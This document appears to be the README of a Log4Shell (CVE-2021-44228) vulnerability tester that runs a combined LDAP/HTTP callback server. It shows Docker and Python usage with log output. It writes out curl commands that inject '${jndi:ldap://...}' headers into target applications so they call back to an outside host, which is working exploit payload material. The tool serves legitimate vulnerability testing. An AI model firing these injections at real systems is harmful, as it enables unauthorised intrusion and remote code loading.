# One-and-only-port Log4Shell vulnerability tester 

This is a lightweight vulnerability tester for the Log4Shell vulnerability (CVE-2021-44228)

It is designed to run both **LDAP** and **HTTP** server on the **same port** for some ease of use in some organisations.  
The script is delivered as a one single file for ease of "deployment" in some cases where you can't access internet and just have clipboard features.   

Please note that the code doesn't need any extra dependencies (except ASN1) for ease of deployment. 

## ASN1 Deployment in some specific cases 

Assuming you just have clipboard feature, you can download the ASN1 lib file and put it in the same directory of the python script.

Download link of the ASN1 file : https://pypi.org/project/asn1/#files  

Unzip it, and copy the **asn1.py** file, and you are ready to go.   

## poc-v1-simple.py 

This file is the original script, very simple with no url list checker integrated  
In the case you are not familiar with python or scripting, and you want to understand **EVERYTHING** that runs, please consider using this file instead.  

## JNDIObj.java & JNDIObj.java files 

The **JNDIObj.class** file is the compiled file of the **JNDIObj.java**

To be sure of what you execute 

```sh 
rm JNDIObj.class
javac JNDIObj.java
```

Note: There is a variable *urlToCallBack* that contains a very long chain that is used to tamper the JNDIObj dynamically in order to call back to different HTTP addresses; 

## Docker usage 

By default the docker image listen on 0.0.0.0:8080

```sh 
$ docker run --rm -ti --network=host dcylabs/log4shell-vulnerability-tester python3 poc.py 192.168.12.155 1234

######################################################
#                                                    #
#           LOG4SHELL VULNERABILITY TESTER           #
#                                                    #
#   This program is used to test Log4Shell vuln.     #
#   it is designed to run both, LDAP and HTTP srv.   #
#   on the same port for some organization purpose   #
#                                                    #
#   Note: it is written in the objective to have     #
#       no extra dependencies than pythons ones      #
#                                                    #
#                                Ludovic DECAMPY     #
#                                                    #
######################################################

[ Main      ] Usage: 
[ Main      ]     curl <target> -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:1234/<unique hash>} '
[ EvilServ  ] Server started on 192.168.12.155:1234
[ EvilServ  ] Connection from address: ('192.168.12.155', 51031)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51032)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51033)
[ EvilServ  ] Vulnerability confirmed for: site-A-BBD56E
[ EvilServ  ] Connection from address: ('192.168.12.155', 51034)
[ EvilServ  ] Vulnerability confirmed for: site-A-BBD56E
[ EvilServ  ] Connection from address: ('192.168.12.155', 51037)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51038)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51039)
[ EvilServ  ] Vulnerability confirmed for: site-K-EF983A
[ EvilServ  ] Connection from address: ('192.168.12.155', 51040)
[ EvilServ  ] Vulnerability confirmed for: site-K-EF983A
```

To attack some url with the dockerized checker 

```sh 
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:1234/todocker-A-BBD56E}'
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:1234/todocker-K-EF983A}'
```

## Python usage  

### Use as a simple server 

When using in native python you need to specify which ip and port you listen on

```sh 

$ python3 poc.py 192.168.12.155 8888 

######################################################
#                                                    #
#           LOG4SHELL VULNERABILITY TESTER           #
#                                                    #
#   This program is used to test Log4Shell vuln.     #
#   it is designed to run both, LDAP and HTTP srv.   #
#   on the same port for some organization purpose   #
#                                                    #
#   Note: it is written in the objective to have     #
#       no extra dependencies than pythons ones      #
#                                                    #
#                                Ludovic DECAMPY     #
#                                                    #
######################################################

[ Main      ] Usage: 
[ Main      ]     curl <target> -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/<unique hash>} '
[ EvilServ  ] Server started on 192.168.12.155:8888
[ EvilServ  ] Connection from address: ('192.168.12.155', 51031)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51032)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51033)
[ EvilServ  ] Vulnerability confirmed for: site-A-BBD56E
[ EvilServ  ] Connection from address: ('192.168.12.155', 51034)
[ EvilServ  ] Vulnerability confirmed for: site-A-BBD56E
[ EvilServ  ] Connection from address: ('192.168.12.155', 51037)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51038)
[ EvilServ  ] Connection from address: ('192.168.12.155', 51039)
[ EvilServ  ] Vulnerability confirmed for: site-K-EF983A
[ EvilServ  ] Connection from address: ('192.168.12.155', 51040)
[ EvilServ  ] Vulnerability confirmed for: site-K-EF983A

```

To attack some url with the checker 

```sh 
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/site-A-BBD56E}'
$ curl <vulnerable-app>:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8888/site-K-EF983A}'
```

### Use as a URL List Checker 

```sh 
$ python3 poc.py 192.168.12.155 8080 url.txt 

######################################################
#                                                    #
#           LOG4SHELL VULNERABILITY TESTER           #
#                                                    #
#   This program is used to test Log4Shell vuln.     #
#   it is designed to run both, LDAP and HTTP srv.   #
#   on the same port for some organization purpose   #
#                                                    #
#   Note: it is written in the objective to have     #
#       no extra dependencies than pythons ones      #
#                                                    #
#                                Ludovic DECAMPY     #
#                                                    #
######################################################

[ Main      ] Usage: 
[ Main      ]     curl <target> -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8080/<unique hash>} '
[ EvilServ  ] Server started on 192.168.12.155:8080
[ UrlTester ] curl http://127.0.0.1:880 -H 'X-Api-Version: ${jndi:ldap://192.168.12.155:8080/b47e3d7810d1781f90c71232096c8cf4-XAPI}' > /dev/null 2>&1
[ EvilServ  ] Connection from address: ('192.168.12.155', 50987)
[ EvilServ  ] Connection from address: ('192.168.12.155', 50988)
[ EvilServ  ] Connection from address: ('192.168.12.155', 50989)
[ EvilServ  ] Vulnerability confirmed for: b47e3d7810d1781f90c71232096c8cf4-XAPI
[ EvilServ  ] Connection from address: ('192.168.12.155', 50990)
[ EvilServ  ] Vulnerability confirmed for: b47e3d7810d1781f90c71232096c8cf4-XAPI
[ UrlTester ] All URLs checked
[ EvilServ  ] Stopping server ...
[ EvilServ  ] No new connections
[ EvilServ  ] Server stopped
```